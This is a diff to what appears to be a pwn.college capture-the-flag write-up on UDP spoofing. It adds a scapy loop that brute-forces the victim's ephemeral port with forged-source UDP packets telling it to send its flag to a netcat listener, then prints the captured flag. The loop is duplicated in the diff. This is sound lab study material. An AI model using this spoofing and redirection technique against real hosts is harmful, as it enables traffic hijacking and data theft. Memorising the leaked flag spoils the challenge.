@@ -2087,6 +2087,38 @@ network.run()
 user_host.interactive(environ=parent_process.environ())
 ```
 
+This time the client does not bind it's socket to any port explicitely. rahter implicitly when sending the first `sendto()`, and reuses that same socket and port for receiving.
+
+So we will have to brute-force the port on which the client
+
+```
+root@ip-10-0-0-1:/# nc -u -lvp 9999 &
+[1] 1136
+```
+
+```py
+>>> from scapy.all import *
+>>> 
+>>> for port in range(32768, 61000):
+...     pkt = IP(src="10.0.0.3", dst="10.0.0.2") / UDP(sport=31337, dport=port) / Raw(load="FLAG:10.0.0.1:9999")
+...     send(pkt, verbose=0)
+... 
+nc: getnameinfo: Temporary failure in name resolution
+pwn.college{gaHGS_2JwLNSOQCbFMznbkN_zzL.QX2QDM2EDL4ITM0EzW}
+```
+
+
+```py
+In [1]: from scapy.all import *
+   ...: 
+   ...: for port in range(32768, 61000):
+   ...:     pkt = IP(src="10.0.0.3", dst="10.0.0.2") / UDP(sport=31337, dport=port) / Raw(load="FLAG:10.0.0.1:9999")
+   ...:     send(pkt, verbose=0)
+   ...: 
+nc: getnameinfo: Temporary failure in name resolution
+pwn.college{gaHGS_2JwLNSOQCbFMznbkN_zzL.QX2QDM2EDL4ITM0EzW}
+```
+
 &nbsp;
 
 ## UDP Spoofing 4
